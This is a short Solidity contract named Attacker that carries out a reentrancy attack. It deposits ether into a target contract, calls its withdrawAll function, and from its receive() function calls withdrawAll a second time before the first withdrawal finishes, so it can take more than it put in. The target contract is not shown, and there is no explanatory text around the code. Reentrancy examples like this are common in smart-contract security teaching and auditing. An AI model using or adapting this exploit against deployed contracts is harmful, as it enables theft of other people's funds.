contract Attacker {
    uint count;
    C target;

    function depositToTarget(address _c) external payable {
        C(_c).deposit{value: msg.value}();
    }

    function withdrawAllFromTarget(address _c) external {
        target = C(_c);
        target.withdrawAll();
    }

    receive() external payable {
        if (count == 0) {
            count++;
            target.withdrawAll();
        }
    }
}
